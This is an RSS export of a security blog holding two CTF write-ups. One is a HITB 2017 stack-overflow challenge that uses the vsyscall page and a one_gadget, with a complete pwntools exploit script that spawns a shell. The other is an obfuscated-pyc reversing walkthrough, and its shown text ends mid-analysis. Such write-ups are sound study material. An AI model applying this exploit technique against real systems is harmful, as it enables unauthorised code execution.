<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hc1m1</title>
    <link>http://0x48.pw/</link>
    <atom:link href="/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</description>
    <pubDate>Wed, 30 Aug 2017 11:47:46 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>HITB CTF 2017 Pwn题研究🙉</title>
      <link>http://0x48.pw/2017/08/29/0x49/</link>
      <guid>http://0x48.pw/2017/08/29/0x49/</guid>
      <pubDate>Tue, 29 Aug 2017 11:11:04 GMT</pubDate>
      <description>
      
        &lt;p&gt;上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>上周的HITB CTF 2017看了两道Pwn题，可是都没做出来，看了writeup后，发现又学到了新姿势了…..</p>
<a id="more"></a>
<p>题目在我GitHub上有：🔞<a href="https://github.com/Hcamael/CTF_repo/tree/master/HITB%20CTF%202017/Pwn2(1000levels)" target="_blank" rel="external">https://github.com/Hcamael/CTF_repo/tree/master/HITB%20CTF%202017/Pwn2(1000levels)</a></p>
<h1 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h1><p>这题是一道栈溢出的题目，溢出点也很容易找到，但问题是开了EIP，当时的思路是想可能有啥骚操作可以让hint函数泄露出system地址……可惜一直想错了，最主要有一个知识点我不知道</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> cat /proc/self/maps</span></div><div class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</div></pre></td></tr></table></figure>
<p>以前从来没注意到过，linux下的每个程序都有一个这样的虚拟地址，而且不管开没开EIP，这段地址都是不变的。</p>
<p>再开看看这段地址是啥指令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; x/5i 0xffffffffff600000</div><div class="line">   0xffffffffff600000:	mov    rax,0x60</div><div class="line">   0xffffffffff600007:	syscall </div><div class="line">   0xffffffffff600009:	ret</div></pre></td></tr></table></figure>
<p>就是一个不知道啥的系统调用然后ret，然后查了一些资料，这段地址是内核映射出来让程序调用内核一些功能的。而这段有用的指令就是一个ret，那么通过这个ret我们能进行怎样的骚操作？</p>
<p>首先要先能理清楚栈结构，当我们的的流程是这样的时候：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">main -&gt; hint -&gt; main -&gt; go -&gt; level</div></pre></td></tr></table></figure>
<p>首先我们调用hint函数时，栈是这样的：</p>
<p><img src="http://qn.lazysheep.cc/img/hitb1.png" alt="hitb1"></p>
<p>然后在hint函数中并没有输出system的地址，但是却把system的地址放入了栈中</p>
<p>执行完hint函数后，返回main函数，然后再调用go函数，这个时候栈是这样的：</p>
<p><img src="http://qn.lazysheep.cc/img/hitb2.png" alt="hitb2"></p>
<p>在hint函数中存放system地址的栈是在上图中变量v6的位置，在go函数中还调用了level函数，而溢出正好就是在level函数中，所以如果我们溢出构造一个栈地址如下所示</p>
<table>
<thead>
<tr>
<th style="text-align:center">0xffffffffff600000</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">0xffffffffff600000</td>
</tr>
<tr>
<td style="text-align:center">0xffffffffff600000</td>
</tr>
<tr>
<td style="text-align:center">v6(&amp;system)</td>
</tr>
</tbody>
</table>
<p>这样就能执行system函数了</p>
<p>然后我们再来解决其他问题，v6是啥？会不会覆盖system，能执行system但是不能控制参数等问题。</p>
<p>见如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">v2 = read_num();</div><div class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</div><div class="line">	v5 = v2;</div><div class="line"><span class="keyword">else</span></div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Coward"</span>);</div><div class="line"><span class="built_in">puts</span>(<span class="string">"Any more?"</span>);</div><div class="line">v3 = read_num();</div><div class="line">v6 = v5 + v3;</div></pre></td></tr></table></figure>
<p>上面的代码是ida反编译go函数的代码，这部分要结合汇编看</p>
<p>v5和v6的地址是一样的，所以如果输入的v2值大于0，则会把system的地址覆盖掉，这很好解决，输入负数和0都行，然后通过v3的输入，我们能在system地址的基础上进行加减。</p>
<p>因为有libc，所以我们可以先获取system的符号地址为<code>0x45390</code></p>
<p>然后使用<code>one_gadget</code>工具：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> one_gadget libc.so.6 </span></div><div class="line">0x4526a	execve("/bin/sh", rsp+0x30, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x30] == NULL</div><div class="line"></div><div class="line">0xcd0f3	execve("/bin/sh", rcx, r12)</div><div class="line">constraints:</div><div class="line">  [rcx] == NULL || rcx == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xcd1c8	execve("/bin/sh", rax, r12)</div><div class="line">constraints:</div><div class="line">  [rax] == NULL || rax == NULL</div><div class="line">  [r12] == NULL || r12 == NULL</div><div class="line"></div><div class="line">0xf0274	execve("/bin/sh", rsp+0x50, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x50] == NULL</div><div class="line"></div><div class="line">0xf1117	execve("/bin/sh", rsp+0x70, environ)</div><div class="line">constraints:</div><div class="line">  [rsp+0x70] == NULL</div><div class="line"></div><div class="line">0xf66c0	execve("/bin/sh", rcx, [rbp-0xf8])</div><div class="line">constraints:</div><div class="line">  [rcx] == NULL || rcx == NULL</div><div class="line">  [[rbp-0xf8]] == NULL || [rbp-0xf8] == NULL</div></pre></td></tr></table></figure>
<p>能获取到执行<code>execve(&#39;/bin/sh&#39;)</code>指令的地址，随便选一个和system地址相减得到差值，这个值就是v3，这样就把system的地址设置成执行<code>execve</code>的地址了，这样当rip跳到这里时就能直接执行系统命令了。</p>
<p>但是还有一个小细节：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( v6 &gt; <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">if</span> ( v6 &lt;= <span class="number">999</span> )</div><div class="line">    &#123;</div><div class="line">      v7 = v6;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"More levels than before!"</span>);</div><div class="line">      v7 = <span class="number">1000L</span>L;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">"Let's go!'"</span>);</div><div class="line">    v4 = time(<span class="number">0L</span>L);</div><div class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)level(v7) != <span class="number">0</span> )</div><div class="line">    &#123;</div><div class="line">      v1 = time(<span class="number">0L</span>L);</div><div class="line">      <span class="built_in">sprintf</span>((<span class="keyword">char</span> *)&amp;v8, <span class="string">"Great job! You finished %d levels in %d seconds\n"</span>, v7, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v1 - v4), v3);</div><div class="line">      <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;v8);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"You failed."</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>因为<code>execve</code>的地址大于999，所以v7被设置为1000，所以level需要进行1000次递归</p>
<p>第一种思路是写代码，自动答对所有题目，然后在最后一次递归的时候溢出</p>
<p>还有因为溢出的长度有0x200，所以其实不必跑1000次</p>
<p>如果没有答对题目，递归则会退出，就没法进行溢出了</p>
<p>最后得到payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#! /usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </div><div class="line"></div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(<span class="string">'./1000levels'</span>, env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so.6'</span>&#125;)</div><div class="line">	context.terminal = [<span class="string">'terminator'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</div><div class="line">	context.log_level = <span class="string">"debug"</span></div><div class="line">	<span class="comment"># gdb.attach(p)</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(<span class="string">'47.74.147.103'</span>, <span class="number">20001</span>)</div><div class="line"></div><div class="line">libc_base = <span class="number">-0x45390</span></div><div class="line">one_gadget_base = <span class="number">0x4526a</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ansewer</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">'Question: '</span>) </div><div class="line">	tmp1 = eval(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>])</div><div class="line">	p.recvuntil(<span class="string">'* '</span>)</div><div class="line">	tmp2 = eval(p.recvuntil(<span class="string">' '</span>)[:<span class="number">-1</span>])</div><div class="line">	p.sendline(str(tmp1 * tmp2))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ansewer2</span><span class="params">()</span>:</span></div><div class="line">	p.recvuntil(<span class="string">"Answer:"</span>)</div><div class="line">	p.sendline(<span class="string">"233"</span>)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">p.sendline(<span class="string">'2'</span>)</div><div class="line">p.recvuntil(<span class="string">'Choice:'</span>)</div><div class="line">p.sendline(<span class="string">'1'</span>)</div><div class="line">p.recvuntil(<span class="string">'How many levels?'</span>)</div><div class="line">p.sendline(<span class="string">'-1'</span>)</div><div class="line">p.recvuntil(<span class="string">'Any more?'</span>)</div><div class="line"></div><div class="line"><span class="comment"># p.sendline("2")</span></div><div class="line">p.sendline(str(libc_base+one_gadget_base))</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">999</span>): </div><div class="line">	log.info(i)</div><div class="line">	ansewer()</div><div class="line">p.recvuntil(<span class="string">'Question: '</span>)</div><div class="line"><span class="comment"># gdb.attach(p)</span></div><div class="line"></div><div class="line">p.send(<span class="string">'a'</span>*<span class="number">0x38</span> + p64(<span class="number">0xffffffffff600000</span>) * <span class="number">3</span>) </div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>PS: 这题我没做出来，是看别人的Payload学习的，所以上面的Payload不是我自己写的.</p>
<p>PSS: 因为有别的重要的事，所以另外一题堆的题目暂时没空更新，等有空了会更新上来的</p>
]]></content:encoded>
      
      <comments>http://0x48.pw/2017/08/29/0x49/#disqus_thread</comments>
    </item>
    
    <item>
      <title>Pwnhub之奇妙的巨蟒 Writeup</title>
      <link>http://0x48.pw/2017/08/29/0x38/</link>
      <guid>http://0x48.pw/2017/08/29/0x38/</guid>
      <pubDate>Tue, 29 Aug 2017 04:01:38 GMT</pubDate>
      <description>
      
        &lt;p&gt;本周的Pwnhub延迟到了周一，所以周一中午就看了下这题，是一道Python 的pyc逆向题，思路到挺简单的，但是很花精力&lt;/p&gt;
      
      </description>
      
      <content:encoded><![CDATA[<p>本周的Pwnhub延迟到了周一，所以周一中午就看了下这题，是一道Python 的pyc逆向题，思路到挺简单的，但是很花精力</p>
<a id="more"></a>
<p>本题是一道pyc逆向题，用uncompyle6没法跑出来，所以猜测又是考python的opcode</p>
<p>之前做过相关研究，也写过一篇blog：<a href="http://0x48.pw/2017/03/20/0x2f/">http://0x48.pw/2017/03/20/0x2f/</a></p>
<p>主要是两个参考文档：</p>
<ol>
<li><a href="https://github.com/Python/cpython/blob/2.7/Include/opcode.h" target="_blank" rel="external">opcode.h</a></li>
<li><a href="https://docs.python.org/2/library/dis.html" target="_blank" rel="external">opcode 具体代表的操作</a></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> dis, marshal</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>f = open(<span class="string">"./final.pyc"</span>)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>f.read(<span class="number">8</span>)</div><div class="line"><span class="string">'\x03\xf3\r\nT\x16xY'</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>code = marshal.load(f)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>code.co_consts</div><div class="line">.....(输出太多了省略)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span>code.co_varnames</div><div class="line">(<span class="string">'DIVIDER'</span>,)</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>code.co_names</div><div class="line">(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'int'</span>, <span class="string">'str'</span>, <span class="string">'i'</span>, <span class="string">'q'</span>, <span class="string">'raw_input'</span>, <span class="string">'True'</span>, <span class="string">'aa'</span>, <span class="string">'xrange'</span>, <span class="string">'OO00000O0O0OO0OOO'</span>, <span class="string">'sys'</span>, <span class="string">'OO000OOO0O000O00O'</span>, <span class="string">'time'</span>, <span class="string">'OO0OO00O0OO0OO00O'</span>, <span class="string">'False'</span>, <span class="string">'r'</span>, <span class="string">'marshal'</span>, <span class="string">'c'</span>, <span class="string">'x'</span>, <span class="string">'p'</span>, <span class="string">'None'</span>, <span class="string">'f'</span>, <span class="string">'args'</span>, <span class="string">'kwargs'</span>, <span class="string">'u'</span>)</div></pre></td></tr></table></figure>
<p>我们主要关心上面这三个集合，分别是<code>co_consts</code>, <code>co_varnames</code>, <code>co_names</code></p>
<p>其中：</p>
<ul>
<li>co_consts集合中包含的是该模块中定义的各种数据类型，具体的值，比如定义的对象，赋值的字符串/int型数据</li>
<li>co_varnames表示的是当前作用域的局部变量的变量名</li>
</ul>
<p>接下来就是看具体的opcode：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dis.disassemble_string(code.co_code)</div><div class="line">Traceback (most recent call last):</div><div class="line">IndexError: string index out of range</div><div class="line">string index out of range</div></pre></td></tr></table></figure>
<p>但是发现报错，跑不了，我的思路是一句一句看，从opcode.h头文件中可以看出opcode为1字节，再加上操作数的话就是3字节，所以一句指令的长度是1字节或者3字节，所以：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>dis.disassemble_string(code.co_code[:<span class="number">3</span>])</div><div class="line">          <span class="number">0</span> JUMP_ABSOLUTE    <span class="number">3292</span></div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span>dis.disassemble_string(code.co_code[<span class="number">3292</span>:<span class="number">3292</span>+<span class="number">3</span>])</div><div class="line">          <span class="number">0</span> JUMP_FORWARD       <span class="number">24</span> (to <span class="number">27</span>)</div></pre></td></tr></table></figure>
<p>我使用上面的方面进行简单的测试，发现有一大堆的<code>JUMP_ABSOLUTE</code>和<code>JUMP_FORWARD</code>指令，这时就知道这里有混淆了。</p>
<p>参考文档，我们可以知道<code>JUMP_ABSOLUTE</code>是跳到绝对地址，<code>JUMP_FORWARD</code>是下一个地址加上操作数，比如<code>0 JUMP_FORWARD       24 (to 27)</code> ，当前地址0，当前指令是3字节，下一个地址是3，加上24是27，所以执行完这句指令是跳到27，这里我只是举例，在本题中，地址0是从code.co_code[0]开始</p>
<p>该模块的最外层很麻烦，追了一会指令流就看不住了，然后就看定义的函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&gt;&gt;&gt; </span>func_list = []                                                           </div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> code.co_consts:</div><div class="line"><span class="meta">... </span>    <span class="keyword">if</span> type(x) == type(code.co_consts[<span class="number">0</span>]):</div><div class="line"><span class="meta">... </span>        func_list.append(x)</div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> func_list:</div><div class="line"><span class="meta">... </span>    <span class="keyword">print</span> x.co_name                  <span class="comment"># 函数名</span></div><div class="line">a</div><div class="line">q</div><div class="line">a</div><div class="line">a</div><div class="line">a</div><div class="line">aa</div><div class="line">a</div><div class="line">a</div><div class="line">aa</div><div class="line">r</div><div class="line">a</div><div class="line">a</div><div class="line">a</div><div class="line">p</div><div class="line">a</div><div class="line">a</div><div class="line">a</div><div class="line">f</div><div class="line">a</div><div class="line">&lt;setcomp&gt;</div><div class="line">&lt;dictcomp&gt;</div><div class="line">u</div><div class="line"></div><div class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> x <span class="keyword">in</span> func_list:</div><div class="line"><span class="meta">... </span>    <span class="keyword">print</span> x.co_consts</div><div class="line">(<span class="keyword">None</span>, <span class="number">2574606289</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="string">'hex'</span>, <span class="string">''</span>, <span class="number">2269302367</span>, <span class="number">3999397071</span>, <span class="number">3212575724</span>, <span class="number">4011125418</span>, <span class="number">2541851390</span>, <span class="number">3101964664</span>, <span class="number">4002314880</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="number">3363589608</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">928441828</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, <span class="number">2827689411</span>, <span class="number">3340835492</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="number">0</span>, <span class="number">3149946851</span>, <span class="number">1915448404</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, <span class="number">1761489969</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">3346499627</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="number">0</span>, <span class="number">804230483</span>, <span class="number">1849535108</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">18</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">811440571</span>, <span class="number">694805067</span>, <span class="number">1480591167</span>, <span class="number">2317567929</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="string">''</span>, <span class="number">103332102</span>, <span class="number">3569318510</span>, <span class="number">2445961406</span>, <span class="number">2136442608</span>, <span class="number">3449813582</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1254503156</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, <span class="number">3745711837</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">13</span>, <span class="number">25</span>, <span class="number">254</span>, <span class="number">256</span>, <span class="number">184</span>, <span class="number">139</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">158</span>, <span class="number">161</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">251</span>, <span class="number">142</span>, <span class="number">128</span>, <span class="number">115</span>, <span class="number">5</span>, <span class="number">99</span>, <span class="number">28</span>, <span class="number">130</span>, <span class="number">253</span>, <span class="number">17</span>, <span class="number">219</span>, <span class="number">88</span>, <span class="number">180</span>, <span class="number">14</span>, <span class="number">83</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">57</span>, <span class="number">178</span>, <span class="number">91</span>, <span class="number">245</span>, <span class="number">207</span>, <span class="number">0</span>, <span class="number">249</span>, <span class="number">166</span>, <span class="number">230</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">213</span>, <span class="number">134</span>, <span class="number">240</span>, <span class="number">4</span>, <span class="number">199</span>, <span class="number">255</span>, <span class="number">202</span>, <span class="number">6</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">173</span>, <span class="number">69</span>, <span class="number">227</span>, <span class="number">124</span>, <span class="number">15</span>, <span class="number">141</span>, <span class="number">205</span>, <span class="number">170</span>, <span class="number">11</span>, <span class="number">133</span>, <span class="number">218</span>, <span class="number">149</span>, <span class="number">12</span>, <span class="number">193</span>, <span class="number">67</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">103</span>, <span class="number">151</span>, <span class="number">145</span>, <span class="number">4002470191</span>, <span class="number">2521589842</span>, <span class="number">1264028523</span>, <span class="number">1557840806</span>, <span class="number">2269633706</span>, <span class="number">951771769</span>, <span class="number">1948225321</span>, <span class="number">2840041954</span>, <span class="number">240350730</span>, <span class="number">2835968845</span>, <span class="number">1344465054</span>, <span class="number">1832969381</span>, <span class="number">414996033</span>, <span class="number">893304341</span>, <span class="number">1033856613</span>, <span class="number">2005820485</span>, <span class="number">1655033734</span>, <span class="number">383297387</span>, <span class="number">1110377909</span>, <span class="number">1331741225</span>, <span class="number">98787899</span>, <span class="number">3245587348</span>, <span class="number">3507579705</span>, <span class="number">2710942562</span>, <span class="number">408230478</span>, <span class="number">4193925412</span>, <span class="number">4258146773</span>, <span class="number">3555027567</span>, <span class="number">2696796853</span>, <span class="number">3228309104</span>, <span class="number">1702138493</span>, <span class="number">878416672</span>, <span class="number">1840033377</span>, <span class="number">2212037170</span>, <span class="number">1264539365</span>, <span class="number">155548767</span>, <span class="number">3125510233</span>, <span class="number">2468296542</span>, <span class="number">2105197060</span>, <span class="number">1611521139</span>, <span class="number">2978471848</span>, <span class="number">3090963965</span>, <span class="number">3551862263</span>, <span class="number">4190549182</span>, <span class="number">1060650455</span>, <span class="number">418207362</span>, <span class="number">2505390665</span>, <span class="number">148314961</span>, <span class="number">1392669086</span>, <span class="number">3687927788</span>, <span class="number">740579929</span>, <span class="number">2902468892</span>, <span class="number">3221147519</span>, <span class="number">1094609218</span>, <span class="number">2451398154</span>, <span class="number">2409455404</span>, <span class="number">3351906386</span>, <span class="number">2473439137</span>, <span class="number">3475738179</span>, <span class="number">1904786329</span>, <span class="number">3519084889</span>, <span class="number">979327822</span>, <span class="number">2909197751</span>, <span class="number">2846946149</span>, <span class="number">3980818176</span>, <span class="number">4127800602</span>, <span class="number">1291996042</span>, <span class="number">4037586272</span>, <span class="number">2675091267</span>, <span class="number">199113052</span>, <span class="number">710970151</span>, <span class="number">1897807508</span>, <span class="number">1373489195</span>, <span class="number">1776856572</span>, <span class="number">1804854838</span>, <span class="number">1781505473</span>, <span class="number">3306320587</span>, <span class="number">1760320652</span>, <span class="number">860749406</span>, <span class="number">161432034</span>, <span class="number">3258951656</span>, <span class="number">2792565458</span>, <span class="number">1916846289</span>, <span class="number">2023044049</span>, <span class="number">1935716574</span>, <span class="number">1285095588</span>, <span class="number">3035625565</span>, <span class="number">3586006421</span>, <span class="number">2368742222</span>, <span class="number">3131839710</span>, <span class="number">2298893290</span>, <span class="number">1460710676</span>, <span class="number">4009727955</span>, <span class="number">2535652387</span>, <span class="number">19895811</span>, <span class="number">2953554646</span>, <span class="number">1834358963</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, <span class="number">156819970</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, <span class="number">2362387540</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">807794131</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">1</span>, &lt;code object O0O00O0OOOOO000OO at <span class="number">0x7fd9b10f6ab0</span>, file <span class="string">"ck.py"</span>, line <span class="number">200</span>&gt;, <span class="number">2901513116</span>, <span class="number">1218601877</span>, <span class="number">625447945</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="number">2014553041</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="number">1296050898</span>, <span class="number">2236454079</span>, <span class="number">1998426264</span>, <span class="number">3102970915</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="number">2343257866</span>, <span class="number">676615509</span>, <span class="number">2173771105</span>, <span class="number">697135550</span>, <span class="number">1974986440</span>, <span class="keyword">None</span>)</div><div class="line">(<span class="keyword">None</span>, <span class="string">''</span>, <span class="string">'Wrong key!'</span>, <span class="string">'Good job! The flag is pwnhub&#123;flag:your input(lower case)&#125;'</span>, <span class="number">3463300106</span>, <span class="number">3857901018</span>, <span class="number">3949890875</span>, <span class="number">174919631</span>, <span class="number">1639824250</span>, <span class="number">433978434</span>, <span class="number">3710075802</span>, <span class="number">161154336</span>, <span class="number">33478671</span>, <span class="number">2489981027</span>, <span class="number">1574135945</span>, <span class="number">3935706030</span>, <span class="number">1700692433</span>, <span class="number">832561131</span>, <span class="keyword">None</span>)</div></pre></td></tr></table></figure>
<p>随便看了下各个函数的相关信息，发现u函数中有flag相关信息，然后开始逆u函数，首先收集下u函数的相关变量信息：</p>
